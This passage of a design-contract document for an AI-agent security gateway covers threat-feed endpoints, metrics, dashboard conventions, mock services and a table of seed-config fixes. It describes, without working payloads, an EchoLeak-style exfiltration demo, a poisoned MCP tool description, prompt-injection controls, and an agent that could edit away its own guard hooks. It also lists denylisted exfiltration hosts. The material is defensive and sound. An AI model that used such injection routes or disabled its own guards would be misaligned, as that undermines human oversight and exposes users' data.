- **Scope:** it returns `None` unless the identity matches `params.agents` **or** `interaction.meta.client == "claude-code"`. GOV-05 handles policy proposals and returns `None` without `meta.changes`, so the two never overlap.
- **Blocks:**
  - writes/edits to `protected_paths`;
  - Claude Code `ConfigChange` events touching `config_change_keys`;
  - `UserPromptSubmit` while the agent's budget is exhausted;
  - (strict) `permission_mode == "bypassPermissions"`.
- **Entry:** policy-engine adds the GOV-06 entry (present in `docs/seed-fixes/policy.yaml`). The catalog owner column / `ControlView.owner` = `claude-code-integration`.
- Ref: P12-G2.

---

### A.11 Threat feed (owner: threat-feed)

**A-49 · Feed endpoints and conventions.**
- **Additive endpoints** (route `feed.py`):
  - `GET /api/feed/signatures/{id}` (member) → full signature JSON + `quarantine_reason`, `hits_24h` and the latest self-test results;
  - `POST /api/feed/rollback` (**admin**) `{serial, reason}` → `FeedStatus`.
- **Rollback semantics:**
  - It re-verifies the **cached** verified bundle for that serial (last 5 kept), activates it and sets an **operator pin**: newer pulls are reported but not applied while pinned.
  - It is audited as `feed.updated` with `data.rollback=true`, `actor`, `reason`.
  - `POST /api/feed/refresh` (admin) clears the pin.
  - Anti-rollback is unchanged for network pulls: accept only `serial > active.serial`, and `serial > high_water` or a cached bundle with the same serial + sha.
- **Extras:**
  - `FeedStatus.history[]` items: `sha256, quarantined, vectors, verify_ms, compile_ms, source`;
  - `FeedSignatureView` items: `message, references, quarantine_reason, mode, cves`.
- **Machine tokens:** `FeedStatus.last_error` and SSE `feed.rejected.reason` **start with a machine token**: `bad_signature`, `sha256_mismatch`, `rollback`, `schema`, `expired`, `unreachable`, `wrong_key`.
- **SIG findings:** `Finding.detector = <signature id>`, `Finding.meta = {signature_id, title, aliases}`, category `signature`.
- **Signature `tests` items** use contract `Surface` values and the keys `text` / `tool_name` / `tool_args` / `url` / `meta`, so the suite can replay them through `/v1/guard`.
- **EchoLeak demo host** [SF-06]: the demo payload and the TI-014 / TI-022 vectors use `assets.acme-capital.example`. `host_in` / `host_not_in` keep the staged `*.aegis-corp.example` entries and add `*.acme-capital.example`. `destinations.allowed_link_domains` contains both. Feed service file: `feed_service/demo/echoleak-proxy-payload.md`. mock_llm trigger `[[EMIT_ECHOLEAK_PROXY]]`.
- **Run order:** `scripts/run_stack.py` runs `python -m feed_service keygen --if-missing` and starts the feed **before** the gateway. Reset between judges = `make reset` + `python -m feed_service reset --hard`.
- Refs: P13-#1–#10, P16-G4, P18-I, P20-#10.

---

### A.12 Audit, metrics, stats, self-test reports (owner: audit-metrics unless noted)

**A-50 · Metrics names and registration.**
- The prefix is **`aegis_`** (never `aicl_*`).
- **`MetricsSink.inc()` / `set_gauge()`:**
  - accept names with or without the `aegis_` prefix (normalised to `aegis_<name>`);
  - **auto-register** unknown counters/gauges, with label names fixed on first use;
  - drop label-set mismatches with one WARNING; never raise.
- **Label guard:** values matching `^(req|dec|int|apr|evt|res|ses)_` or longer than 80 chars → `other`; at most 500 label sets per metric.
- **Derived counters** (`aegis_approvals_total`, `aegis_policy_reloads_total`, `aegis_feed_reloads_total`) are fed from audit events. Owners' direct `inc()` calls for them are ignored.
- **Pre-registered additions** to §6.4:
  - `aegis_metadata_stripped_total{kind}`, `aegis_egress_requests_total{result,dest_class}`, `aegis_exfil_hits_total{channel}` (metadata-egress);
  - `aegis_semantic_calls_total{model,outcome}`, `aegis_semantic_model_up{model}` (semantic-models);
  - `aegis_audit_records_total{event_type}`, `aegis_audit_errors_total`, `aegis_audit_chain_ok` (audit-metrics).
- **`aegis_redactions_total{entity,dest_class}`** is incremented by audit-metrics from `verdict.redactions`; redaction-engine does not count.
- Refs: P14-G1, P04-G8, P06-CG-5, P09-#12, P02-#13, P03-§10.

**A-51 · `GET /api/stats/posture`** (route `stats.py`, member).
- Response `PostureResponse` (page-local TS): `{generated_at, score: number /*0..100*/, grade: "A"|"A-"|"B+"|"B"|"C"|"D", policy_version, feed_serial, components: [{id, label, weight, score /*0..1*/, value, status: "ok"|"warn"|"error"|"off"}], findings: [{severity, message, control_id, link}]}`.
- Components and weights:
  - `controls` 35 (enforce 1 / monitor 0.5 / off, disabled or not implemented 0);
  - `selftests` 20 (passed/total from `rt.policy.last_selftest()` when present, else audit-metrics' primer; excluded if unknown);
  - `feed` 15 (ok 1, seed 0.7, rejected 0.6, unreachable 0.5, stale 0.4, disabled 0);
  - `audit` 15 (last verify ok);
  - `models` 10 (semantic degraded 0.5);
  - `governance` 5 (`approvals.rules` and `budgets.limits` non-empty).
- `score = round(100·Σw·s/Σw)`. Grades: ≥95 A, ≥90 A−, ≥85 B+, ≥80 B, ≥70 C, else D.
- **The server endpoint is authoritative.** dashboard-shell's `lib/posture.ts` implements the same formula **only** as the mock fallback.
- Refs: P14-G2, P15-G1.

**A-52 · Warm-up history and synthetic rows** [should].
- **`GET /api/stats/warmup`** (member) → `{synthetic_rows, oldest_ts, newest_ts, primer: {state: "idle"|"running"|"done"|"skipped", samples, tests_passed, tests_total}}`.
- **`POST /api/stats/warmup`** (**admin**) `{days?, per_day?, clear?}` → the same shape.
- **`DELETE /api/stats/warmup`** (**admin**) removes the synthetic rows.
- **Env `AEGIS_WARMUP=auto|off|force`** → `Settings.warmup`. Default `auto` backfills once when `demo_mode` and not `test_mode` and there are no synthetic rows yet. `force` clears and refills on every start. `off` never backfills.
- Synthetic rows live **only** in the `decisions` index table with `synthetic=1`. They are **never** written to the hash-chained audit log; one `system` audit event `{kind: "demo.backfill", rows, window_days}` records the backfill.
- `?synthetic=0|1` on `/api/stats` and `/api/decisions` (default 1 in demo mode). The UI shows an "includes demo history" badge when synthetic rows are in view.
- This is distinct from demo-mocks-docs' `warmup.py`, which drives **real** traffic.
- Ref: P14-G3, P14-G10.

**A-53 · Test-suite results in the dashboard: `/api/selftest`** (served by **audit-metrics** in its owned `stats.py`; the test-suite owns the report format).
- **`GET /api/selftest`** (member) → `reports/results.json` as is (schema `aegis.selftest/1`, the `SelfTestReport` page-local type in plan 18 §4.2), plus the extra `running: bool`. 404 `not_found` if absent.
- **`GET /api/selftest/report`** (member) → `reports/selftest.html` (`text/html`).
- **`POST /api/selftest/run`** (**admin**) → `202 {status: "started"|"running"}`:
  - It is single-flight (a lock).
  - It spawns `[sys.executable, "-m", "pytest", "tests/e2e", "tests/test_coverage.py", "-m", "not semantic and not slow and not live", "-q"]` with `cwd` = the repo root and env `AEGIS_REPORTS_DIR=<reports dir>`.
  - When it finishes, it publishes bus `system` `{level: "info"|"warning", message: "self-test finished: 405/412 pass", component: "selftest"}`.
- **Reports dir:** env **`AEGIS_REPORTS_DIR`** (default `reports`) is honoured by audit-metrics (`/api/perf` bench), test-suite and redteam-eval-perf.
- **`PerfResponse.bench`** may embed `selftest`, `eval`, `heatmap` and `dlp` summaries.
- No new route file and no ownership change (plan 18 proposed `selftest.py` owned by test-suite; that is **declined**).
- Refs: P18-A, P19-G-C5.

**A-54 · Audit, decisions and report extras.**
- **`GET /api/audit`** gains `?decision_id=` and `?seq_from=`. The drawer shows `prev_hash`/`hash`.
- **Owner-internal columns:** `decisions` + `cost_avoided_usd REAL NOT NULL DEFAULT 0, avoided_reason TEXT, categories_json TEXT NOT NULL DEFAULT '[]', synthetic INTEGER NOT NULL DEFAULT 0` (+ `ix_decisions_synth`); `audit_index` + `offset INTEGER, length INTEGER`.
- **Step-11 record:** `data` = `{"summary": DecisionSummary, "detail": DecisionDetail-without-wire}` (models or dicts accepted). Outcome records follow A-08.
- **Public import surface:** `aegis.metrics.stats.control_rollup(rt, window_s=86400) -> dict[str, {"hits", "blocks", "p95_ms"}]`, used by policy-engine for `ControlView.hits_24h/blocks_24h/p95_ms`.
- **`reports/bench.json`** = schema `aegis.bench/1` (plan 19 §2.10, a superset of plan 16 G3). It is surfaced as `PerfResponse.bench`, with `headline` keys `det_overhead_p50_ms, det_overhead_p95_ms, sem_overhead_p50_ms, sem_overhead_p95_ms, rps_det, overhead_share_pct, reload_p95_ms, detection_rate_balanced, fpr_balanced, obfuscation_coverage`.
- **`reports/eval.json`** = `aegis.eval/1`. Missing numbers print `not measured`, never a guess.
- **`.gitignore`:** keep `reports/` ignored except the committed evidence `!reports/eval.json`, `!reports/bench.json`, `!reports/heatmap.json`, `!reports/deck_numbers.md`, `!reports/*.html` (scaffold).
- **Commands:** `python -m aegis verify-audit` dispatches to `aegis.audit.verify:main(argv)`. Makefile alias `audit-verify` (A-58).
- Refs: P14-G4, P14-G8, P14-G9, P14-G11, P16-G3, P16-G5, P19-G-C5.

---

### A.13 Dashboard conventions (owners: dashboard-shell, -security, -governance)

**A-55 · Dashboard decisions.**
- **Toast ownership:**
  - **dashboard-shell** renders global toasts and banners for `feed.updated`, `feed.rejected` (red banner, "enforcing #N"; the `feed` badge turns rose), `budget.threshold`, `mcp.tool` and `system`.
  - **dashboard-governance** exports `<GovernanceToaster/>` from `web/src/components/governance/GovernanceToaster.tsx`. It owns toasts for `approval.created`, `approval.updated` (decided), `policy.applied`, `policy.rejected`, `killswitch` and `org.updated`. **dashboard-shell mounts it once** in the shell layout and does not toast those events itself.
  - Pages toast only the results of their own HTTP actions.
- **Mock fallback (extends §5.4):** also fall back on 2xx-non-JSON and on 5xx without a JSON error envelope. **Never** fall back on any 4xx or on any JSON error envelope.
- **Runtime list:** `@/api/sse` exports `SSE_EVENTS: SseEventName[]`.
- **API client:** `api.download(path: string, filename?: string): Promise<void>`. The client injects `X-Aegis-View-As` on every `/api/*` call. `useLiveDecisions` backfills from `GET /api/decisions?limit=50`, and pages dedupe by `id`.
- **Colors:** the contract palette wins (§3.4). The brand is **indigo**, so violet stays `require_approval`. Fonts are bundled. Team colors come from `teamColor()` (validated palette), not the seed hex values.
- **Admin token** [could]: `localStorage['aegis.adminToken']` → `Authorization: Bearer` on mutating `/api/*` when `AEGIS_ADMIN_TOKEN` is set.
- **Page routes:** `/governance/policy?tab=history&version=N`, `/governance/approvals?id=apr_…`, `/security/audit?seq=N`, `/security/decisions/:id`.
- **Shell page shortcuts:** `g o` overview, `g l` live, `g y` playground, `g t` threats, `g c` coverage, `g u` audit, `g a` approvals, `g b` budgets, `g r` rules, `g g` org, `g p` policy, `g m` perf, `g h` health.
- **Rendering requests:**
  - `Decision.meta.headers_removed`, `.body_fields` and `.media[]` (DLP-03) render as a "Metadata stripped" list;
  - `Decision.meta.inj`, `meta.explain` and `payload.facts/checks/agent_note/diff` render as described above;
  - [optional] an "Attacker received" KPI reads `GET http://127.0.0.1:8793/_mock/hits` (CORS-enabled);
  - an `EvalPanel` and an `ObfuscationHeatmap` render from `bench.eval` / `bench.heatmap`;
  - a "Last self-test" card renders from `/api/selftest` (A-53);
  - a "Redaction quality" panel renders from `/api/redaction/metrics`.
- **Extra fields only through page-local types:** all additive response fields above (`…Ext` types). Frozen `types.ts` / `page.ts` are unchanged.
- Refs: P15-G1–G12, P16-G1–G8, P17-G1–G7, P04-dash, P19-G-C6/G-C7, P20-#8.

---

### A.14 Mocks, ports, settings and environment

**A-56 · Mocks.**
- **Default ports:** mock_llm 8791, mock_mcp 8792, exfil_sink 8793, mock_saas 8794.
- **Env overrides:** `AEGIS_MOCK_LLM_PORT`, `AEGIS_MOCK_MCP_PORT`, `AEGIS_EXFIL_SINK_PORT`, `AEGIS_MOCK_SAAS_PORT`. A `--port` flag wins over the env var, which wins over the default. Policy URLs follow A-35, and `AEGIS_HOST_MAP` must match.
- **In-process start:** each mock package exposes **`create_app() -> FastAPI`** in `mocks/<name>/app.py`. This is for in-process tests; mock_mcp's is owned by mcp-proxy.
- **Additive mock endpoints** (all `GET /_mock/health` → `{service: "<name>"}`, all `POST /_mock/reset`):
  - **mock_llm:** `POST /_mock/scan`; triggers `[[EMIT_ECHOLEAK_PROXY]]` and `[[ERROR:<status>]]`; planner mode.
  - **exfil_sink:** `GET /_mock/ui`; CORS on `/_mock/hits`.
  - **mock_saas:** `GET /payments/plans`, `GET /crm/customers/{id}`, `POST /crm/webhook`, `GET /p/{id}`, `GET /_mock/charges` (`{total_usd, items}`), `DELETE /_mock/requests`. `POST /payments/subscriptions` answers 400 "price mismatch" when the amount disagrees with the catalog.
- **Request logs:** `/_mock/requests` records header **names and values except auth/cookie values**, so judges can see `x-stainless-*` / `x-forwarded-for` removed.
- **Seed alignment:** mock_saas `GET /payments/plans` serves the org seed vendors, including `a100-cluster-week` ($1,500). Demo mail uses `.example` addresses.
- Refs: P18-B, P20-#1, P20-#2, P20-#4, P04-G12.

**A-57 · Settings fields and environment variables** (additions to §6.5; read only via `aegis.settings.Settings`; `.env.example` lists them).

| Var | Default | `Settings` field | Used by |
|---|---|---|---|
| `AEGIS_HOST_MAP` | §5.6 default | `host_map: str` | metadata-egress |
| `AEGIS_WARMUP` | `auto` | `warmup` | audit-metrics |
| `AEGIS_REPORTS_DIR` | `reports` | `reports_dir` | audit-metrics, test-suite, redteam-eval-perf |
| `AEGIS_SEMANTIC_MODELS` | `horizon-small,minilm-l12-multi,eu-pii-ner,aegis-guard,aegis-judge` | `semantic_models` | semantic-models |
| `AEGIS_SEMANTIC_RAM_MB` | `2048` | `semantic_ram_mb` | semantic-models |
| `AEGIS_MOCK_LLM_PORT`, `AEGIS_MOCK_MCP_PORT`, `AEGIS_EXFIL_SINK_PORT`, `AEGIS_MOCK_SAAS_PORT` | 8791, 8792, 8793, 8794 | `mock_llm_port`, `mock_mcp_port`, `exfil_sink_port`, `mock_saas_port` | mocks, run_stack, policy expansion |
| hook client: `AEGIS_AGENT_KEY_FILE`, `AEGIS_HOOK_TIMEOUT_FAST` | `demo/claude/.agent_key`, `10` | — (bash only) | `scripts/aegis-hook` |

- **Existing fields confirmed:** `org_seed`, `demo_mode`, `default_viewer`, `admin_token`, `test_mode`, `data_dir`, `semantic`, `models_dir`, `policy`, `pricing`, `feed_url`, `feed_pubkey`, `ollama_url`, `ui_dist`, `vault_secret`, `log_level`, `log_json`, `access_log`, `live_url`.
- Refs: P04-G7, P06-CG-4, P14-G3, P19-G-C5, P20-#2, P12-G1, P08-notes.

---

### A.15 Requests to scaffold (non-contract, for the scaffold phase)

**A-58 · Manifests, Makefile, gitignore, web config, docs carve-outs.**
- **Dependencies:**
  - **Add** `phonenumbers>=9` (runtime; redaction-engine) and `hypothesis` (dev; core-gateway property tests).
  - **Declined:** `pypdf` (metadata-egress reports unsupported PDFs instead), `monaco-yaml` and `yaml` (npm; the policy editor uses its minimal provider).
  - If Recharts 2.x is pinned with React 19, add `react-is@19`.
  - Make sure the explicit `@radix-ui/*` list from plan 15 §7 is present.
  - All guarded imports must degrade.
- **Makefile:**
  - `claude` → `demo/claude/run.sh`;
  - `feed-keys` → `uv run --frozen python -m feed_service keygen --if-missing`;
  - `audit-verify` → `uv run --frozen python -m aegis verify-audit`;
  - `demo` → `uv run --frozen python scripts/run_stack.py --demo`;
  - `demo-scene` → `uv run --frozen python demo/scenarios/run.py $(S)`;
  - `demo-preflight` → `uv run --frozen python demo/preflight.py $(ARGS)`;
  - test targets per plan 18 §2.10; `eval` / `bench` / `redteam` per plan 19 §4.2.
  - No `scripts/dev.sh` (use `make up` / `make dev`).
- **`.gitignore`:** add `data/artifacts/` and the `reports/` exceptions from A-54.
- **Web config:**
  - `eslint.config.js` → `react-refresh/only-export-components` with `allowExportNames: ['meta']`;
  - `web/index.html` → `<html lang="en" class="dark">`, `<meta name="color-scheme" content="dark">`, `<meta name="theme-color" content="#07080A">`, `<link rel="icon" href="/favicon.svg">`, `<body class="bg-[#07080A]">`;
  - `components.json` → `style: new-york`, `tailwind.css: src/styles/globals.css`, `baseColor: zinc`, `cssVariables: true`, aliases `@/components`, `@/components/ui`, `@/lib`, `@/lib/utils`, `iconLibrary: lucide`;
  - `vite-env.d.ts` references `vite/client`.
- **Docs carve-outs** from demo-mocks-docs' `docs/**`:
  - `docs/MASTER_PLAN.md` and `docs/TASKS.md` belong to the orchestrator (synthesizer B);
  - `docs/plan/BUNDLES.json` belongs to synthesizer B;
  - `docs/status/<bundle>.md` belongs to each bundle;
  - `docs/seed-fixes/*` belongs to the orchestrator (synthesizer A) and is read-only for implementers.
- Refs: P03-deps, P01-deps, P04-deps, P15-G9–G11, P17-deps, P12-G8, P13-#10, P14-G11, P18-J, P19-G-C5, P20-#3, P20-#9.

---

### A.16 Seed fixes (`docs/seed-fixes/`; `staging/` stays untouched)

**The files:**
- `docs/seed-fixes/org.seed.yaml` is **config-ready**: org-rbac copies it to `config/org.seed.yaml`.
- `docs/seed-fixes/policy.yaml` is a complete contract-format `config/policy.yaml` (validates against the frozen `PolicyDoc`; 39 controls; 45 inline tests). policy-engine starts `config/policy.yaml` and `config/policy.golden.yaml` from it, then merges the snippets per A-34.
- `docs/seed-fixes/approvals.yaml` is the canonical `approvals:` section (46 rules, 33 config rules, 54 routing tests, all passing in a first-match simulator). `config/snippets/approvals-engine.yaml` must equal it. Its rule ids are binding.

Every fix is tagged `[SF-nn]` in the files. Values tagged this way must survive snippet merges.

| ID | Bug found by planners | Fix | Files | Applied by |
|---|---|---|---|---|
| **SF-01** | The two-person rule can never complete: the seed has **one** owner, so "two owners" is impossible (P09-#4, P18-G) | Two-person = owner + a distinct admin, plus proposer co-sign (A-20). Still one owner on purpose | approvals.yaml (header, rules `spend-owner-2p`, `disable-control-strict`, `raise-org-2x`, `deploy-prod-strict`, `db-prod-bulk-delete-strict`); org.seed.yaml comment | approvals-engine (eligibility), org-rbac |
| **SF-02** | Seed tool allowlists contain no purchase tool for `research-agent@research` and `claude-code@platform`, so **GOV-03 blocks the $12 and $480 F4 flows before ACT-01 can route them** (P10-G5) | research-agent allow `payments.create_charge`, `marketpulse.*`. claude-code allow every built-in it uses plus `"*.*"` (all MCP tools), deny `acme-crm.export_*`, `WebFetch`. All globs in `<server>.<tool>` form. Regression tests `GOV-03/research-agent-may-buy-dataset`, `GOV-03/claude-code-may-call-payments` and top-level `f4-spend-12-reaches-approval`, `f4-gpu-480-reaches-approval` | org.seed.yaml, policy.yaml | org-rbac, policy-engine |
| **SF-03** | Model allowlists use provider-prefixed ids (`ollama/qwen3.5:0.8b`), so GOV-02 blocks local (`aegis-judge`) and mock (`mock-echo`) demo traffic (P20-#7, P08 reuse map) | Wire globs: research-agent `["aegis-judge*", "qwen*", "hf.co/*"]`; trading-copilot `["claude-haiku-*", "claude-sonnet-*", "meta-llama/*", "aegis-judge*", "qwen*", "mock-*"]` (no gpt-4.1-mini / opus, so the GOV-02 demo blocks still work); chaos-agent `["aegis-judge*", "qwen*", "claude-haiku-*", "mock-*"]`; claude-code `["claude-*", "aegis-judge*", "qwen*", "mock-*"]`. Defaults `mock-echo` / `aegis-judge` | org.seed.yaml | org-rbac |
| **SF-04** | **DLP-01 blocks every external email before ACT-03 can route it.** The §4.3 matrix has `CONFIDENTIAL.third_party: block`, and the recipient address is an EMAIL (P10-G12) | Balanced matrix `CONFIDENTIAL.third_party: redact` (the frozen schema default; strict/paranoid tighten via `DLP-01.params.matrix_overrides`). New `DLP-01.params.routing_args` exempts recipient args (`to/cc/bcc/recipient(s)` of `mailer.*`, `*.send_email`, `*.send_*`): findings are logged, never redacted. ACT-03 governs recipients, and placeholders count as their class for `data_class`. Tests `DLP-01/email-recipient-not-blocked`, `DLP-01/pesel-to-third-party-tokenized`, top-level `f4-external-email-reaches-approval` | policy.yaml | policy-engine (matrix, tests), redaction-engine (`routing_args`, `matrix_overrides`), action-guards (ACT-03 labels) |
| **SF-05** | **Poisoned-tool self-test vs INJ-01:** INJ-01 also fires on the `<IMPORTANT>` description on `mcp.list` and returns `block` (staging action), so the final ≠ MCP-02's `redact` and the candidate policy is rejected (P11 risk, P11-req) | INJ-01/02 answer `redact` (quarantine) on untrusted surfaces including `mcp.list`, never `block`. MCP-02 owns dropping the tool (remove mutation). SIG-01 `strip_tool` → redact + remove (A-46). The test `MCP-02/poisoned-add` is control-attributed (control-scoped comparison, A-29). The self-test never skips the semantic phase (A-09). New test `INJ-01/poisoned-description-quarantined` | policy.yaml | injection-defense, mcp-proxy, threat-feed, policy-engine, core-gateway |
| **SF-06** | **TI-022 demo link domain:** DLP-06 strips the EchoLeak image before the feed demo matters, because the asset host is not in `allowed_link_domains`. The staged payload uses `assets.aegis-corp.example`; threat-feed renames it to `assets.acme-capital.example` (P13-#6b, P20-#10) | `destinations.allowed_link_domains: ["docs.acme-capital.example", "assets.acme-capital.example", "assets.aegis-corp.example"]` (both variants work). Test `DLP-06/allowlisted-asset-image-kept`. The org seed lists the host | policy.yaml, org.seed.yaml | policy-engine, threat-feed (payload host), demo-mocks-docs (mock_llm trigger) |
| **SF-07** | `internal_domains: ["*.acme-capital.example"]` does not match the apex, so `ops@acme-capital.example` counts as external | `internal_domains: ["acme-capital.example", "*.acme-capital.example", "*.corp.local", "*.internal", "*.acme.test"]`. `email.external` `args_not_match` accepts subdomains. Test `ACT-03/internal-email-allowed` | policy.yaml | policy-engine, action-guards |
| **SF-08** | Staged `APR-DATA-PROD-BULK-DELETE` (owner + admin) would turn the F4 flow "`DELETE FROM trades` (env prod) → owner" into two-person, because ACT-02 labels an unbounded DELETE `bulk` | `db-prod-bulk-delete-strict` only under `profiles: [strict, paranoid]`. Balanced → `db-prod-write` (owner) | approvals.yaml | approvals-engine |
| **SF-09** | Contract example `raise-team-small` ≤ +50 % vs BRIEF "raise budget > 2× → owner" vs staging ≤ 2× | Team raise ≤ +100 % (≤ 2×) → admin; > 2× → owner (`raise-large`). F5 (+25 % admin, +150 % owner) is unchanged | approvals.yaml | approvals-engine, dashboard-governance (presets) |
| **SF-10** | Staging routed unmatched config changes to admin; the contract says owner | `default_config_approver: owner` (fail closed). Test `unmatched-type-fails-closed` | approvals.yaml | approvals-engine |
| **SF-11** | Staged deterministic timeouts of 2–20 ms → spurious fail-closed blocks under `to_thread` | Not ported; schema default 250 ms; completed tasks always used (A-05) | policy.yaml | policy-engine, core-gateway |
| **SF-12** | API keys expire 2026-10-31 / 2026-10-04 (chaos), so tests rot after the event. No expired-key or disabled-agent fixtures exist for GOV-01 | Expiry 2027-10-31; new `key_expired_demo` (`aegis_demo_expired_key_0000000000000098_NOT_A_SECRET`); new disabled agent `legacy-bot@platform` (sponsor u_marek). Test `GOV-01/disabled-agent-blocked` | org.seed.yaml, policy.yaml | org-rbac, test-suite |
| **SF-13** | research-agent starts the demo at 92 % of its compute budget (4950/5400 s, soft state) | `demo_state` research team/agent `local_compute_s_today` 4950 → 2400 (org total 6120 → 3570; agent USD 0.99 → 0.48) | org.seed.yaml | org-rbac (file), budgets-ledger (reader) |
| **SF-14** | Seed resources use staging entity names (`PL_PESEL`, `CREDIT_CARD`, `POSTAL_ADDRESS`) and lack the mock hosts. There is no $1,500 plan for the two-person flow | `contains` uses contract entities; databases get `mcp_server: acme-db`; `external_hosts` get `dest_class` + `pay.saas.test`, `crm.saas.test`, `paste.test`/`exfil.test` (denylisted), `docs./assets.acme-capital.example`; vendor plan `gpucloud/a100-cluster-week` $1,500 | org.seed.yaml | org-rbac, action-guards (catalog), demo-mocks-docs (mock_saas plans) |
| **SF-15** | The seed says Claude Code sends its key in `ANTHROPIC_AUTH_TOKEN`, which would replace its OAuth token | Key carrier = `X-Aegis-Agent-Key` via `ANTHROPIC_CUSTOM_HEADERS` (A-17); comments fixed; `integration.key_header` | org.seed.yaml | claude-code-integration (`demo/claude/settings.json`), org-rbac, core-gateway |
| **SF-16** | Kill switch: the contract says engage = admin ("tighten"); staging says anyone, instantly | Engage on an agent you sponsor → `killswitch-own-agent` (auto); any other engage incl. global → `tighten` (admin); release → `loosen-threshold` (admin); global release → owner. Owners/admins apply directly (GOV-05) | approvals.yaml | approvals-engine |
| **SF-17** | `demo_state.approval_history` uses staging types and rule ids (`agent_action.spend`, `APR-SPEND-SELF`) | Contract `kind`, `action_type`, `rule_id`, `required_role`, `decided_by` | org.seed.yaml | approvals-engine (APR-12 seeds it), org-rbac |
| **SF-18** | F5 "u_marek disables DLP-02 → owner" needs DLP-02 to be `critical`; §4.4 sets no severity | `severity: critical` for DLP-02, EXE-01, SIG-01, SIG-02 | policy.yaml | policy-engine |
| **SF-19** | The model could edit away its own guard (hook settings, MCP config, key file) | EXE-02 `fs_deny` += harness paths; `allow_hosts: ["127.0.0.1:8791-8799"]`. Test `EXE-02/write-hook-settings-blocked` | policy.yaml | policy-engine, action-guards |
| **SF-20** | The $480 Claude Code scene calls `mcp__payments__create_charge`, but the planned `demo/claude/mcp.json` server list omits `payments` | `mcp.json` routes all nine demo servers incl. `payments`, with Bearer key + `X-Aegis-Agent` (A-47) | (demo/claude, not a seed file) | claude-code-integration, mcp-proxy (claude_config default list) |
| **SF-21** | Agent `models.default` used provider-prefixed ids | Wire names (`claude-sonnet-4-5`, `aegis-judge`, `mock-echo`) | org.seed.yaml | org-rbac |
| **SF-22** | INJ-02 threshold 0.90 (contract) vs measured optimum 0.80 (RESULTS.md) | `threshold: 0.80`, `timeout_ms: 700`, escalation band 0.50–0.80 → Qwen3Guard | policy.yaml | policy-engine, injection-defense |
| **SF-23** | No approval rules for governed org changes | `org-owner-grants` (owner), `org-privileged` (owner), `org-routine` (admin) for `org.*` action types | approvals.yaml | approvals-engine, org-rbac |
| **SF-24** | No rules for GOV-04 generic approvals, DLP matrix `require_approval` cells and INJ-05 drift | `tool-approve` (`tool:*` → admin), `dlp-release` (admin), `goal-drift` (self), `code-exec` catch-all (admin) | approvals.yaml | approvals-engine |
| **SF-25** | The "view as" switcher has no role aliases or default viewer in the seed | `control_plane.view_as_aliases: {owner: u_katarzyna, admin: u_emily, member: u_piotr}`, `default_viewer: u_katarzyna` | org.seed.yaml | org-rbac |
| **SF-26** | GOV-06 has no policy entry | GOV-06 control entry + test `edit-hook-settings-blocked` | policy.yaml | policy-engine, claude-code-integration |
| **SF-27** | The egress spend rules in the plans used pseudo-paths (`@method`, `@path`) that the agreed egress `tool_args` shape does not have | `actions:` egress rules use `{method, url}` + `amount_arg: json.amount_usd`, `resource_arg: json.vendor` (A-13). CRM lookups are **not** classified as `db.read` (no per-call admin approval); `acme-crm.export_*` is governed by GOV-04 `approve_tools` | policy.yaml | action-guards, metadata-egress, policy-engine |

**Verification done by synth-A:**
- `PolicyDoc.model_validate(docs/seed-fixes/policy.yaml)` passes.
- The approvals block equals `approvals.yaml`.
- 54/54 routing tests pass (role, rule, two-person and approver eligibility).
- All regexes compile.
- Every test agent and member exists in the seed.
- GOV-03 allow/deny was spot-checked for the F4 tools.

---

### A.17 Gap traceability (every plan's "Contract gaps" item → decision)

**204 gap items** from all 20 plans are resolved by A-01…A-58 and SF-01…SF-27. Declined proposals are marked ✗, with the replacement decision. Requests-to-owner lists are covered by the same items.

| Plan | Items → decision |
|---|---|
| 01 core-gateway (11) | #1→A-06 · #2→A-08 · #3→A-16 · #4→A-16 · #5→A-13 · #6→A-13 · #7→A-06 · #8→A-05 · #9→A-16 · #10→A-07 · #11→A-16 |
| 02 policy-engine (14) | #1→A-31 · #2→A-31 · #3→A-32, A-24 · #4→A-32, A-26 · #5→A-29 · #6→A-33 · #7→A-30 · #8→A-14 · #9→A-32, A-16 · #10→A-33 · #11→A-33 · #12→A-31 · #13→A-50 · #14→A-16 |
| 03 redaction-engine (8) | §4.2 placeholders surface→A-39 · §4.2 engine extras→A-39 · §4.2 response path→A-40 · §4.3 entities→A-41 · §4.3 mappings→A-41 · §4.3 endpoints→A-43 · §4.4 shared tokenizer ✗→A-38 · `phonenumbers`→A-58 |
| 04 metadata-egress (13) | G1(1–4)→A-13 · G1(5) ✗→A-40 · G2→A-01 · G3→A-10 · G4→A-42 · G5→A-13 · G6→A-40 · G7→A-57 · G8→A-50 · G9→A-30 · G10→A-42 · G11→A-42 · G12→A-56 · dashboard→A-55 |
| 05 injection-defense (9) | #1→A-42, A-41 · #2→A-02 · #3→A-13, A-45 · #4→A-44 · #5→A-45 · #6→A-45, SF-22 · #7→A-26, A-45 · #8→A-45 · #9→A-45, A-55 |
| 06 semantic-models (9) | CG-1→A-38 · CG-2→A-44 · CG-3→A-44, A-16 · CG-4→A-44, A-57 · CG-5→A-44, A-50 · CG-6→A-44 · CG-7→A-44 · CG-8→A-44 · CG-9→A-44 |
| 07 budgets-ledger (12) | G1→A-06 · G2→A-07 (generalised: 429 for every client) · G3→A-13 · G4→A-08 · G5→A-08 · G6→A-13 · G7→A-34, A-33 · G8→A-24, A-25 · G9→A-09, A-29 · G10→A-22, SF-16 · G11→A-32, A-36 · G12→A-36 · requests→A-36 |
| 08 org-rbac (10) | G1→A-17 · G2→A-25 · G3→A-26 · G4→A-37 · G5→A-37 · G6→A-18 · G7→A-37 · G8→A-37 · G9→A-30 · G10→A-37, SF-12/14/25 · notes→A-37, A-36, A-16 |
| 09 approvals-engine (12) | #1→A-21 · #2→A-22 · #3→A-22, A-34 · #4→A-20, SF-01 · #5→A-30 · #6→A-02 · #7→A-28 · #8→A-23 · #9→A-27 · #10→A-17 · #11→A-37 · #12→A-50, A-28 |
| 10 action-guards (12) | G1→A-01 · G2→A-13 · G3→A-13 · G4→A-13 · G5→A-37, SF-02 · G6→A-22, A-28 · G7→A-36 · G8→A-29, A-30, A-33, A-34 · G9→A-24, A-55 · G10→A-27 · G11→A-26, A-27 · G12→A-42, SF-04 |
| 11 mcp-proxy (9) | #1→A-13 · #2→A-13 · #3→A-46 · #4→A-46 · #5→A-24, A-26 (`labels.dest`) · #6→A-46 · #7→A-46 · #8→A-46 · #9→A-46 · requests→A-46, A-47, A-40, A-56, SF-05 |
| 12 claude-code-integration (10) | G1→A-47, A-19 · G2→A-48 · G3→A-17 · G4→A-07, A-13, A-40 · G5→A-23, A-47 · G6→A-47 · G7→A-47 · G8→A-47, A-58 · G9→A-47, SF-19 · G10→A-36 |
